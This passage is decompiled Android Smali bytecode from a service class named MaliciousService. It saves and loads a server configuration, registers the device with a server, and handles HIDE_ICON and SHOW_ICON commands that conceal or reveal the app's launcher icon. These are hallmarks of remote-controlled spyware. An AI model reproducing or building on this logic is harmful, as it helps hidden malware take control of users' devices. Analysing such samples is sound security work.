    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {p3, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 159
    invoke-direct {p0, p2, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 160
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 161
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 163
    :cond_4e
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-eqz p2, :cond_73

    .line 164
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    const-string p3, "HIDE_ICON"

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_64

    .line 165
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->hideIcon()V

    goto :goto_73

    .line 166
    :cond_64
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    const-string p2, "SHOW_ICON"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_73

    .line 167
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->showIcon()V

    .line 171
    :cond_73
    :goto_73
    const/4 p1, 0x1

    return p1
.end method
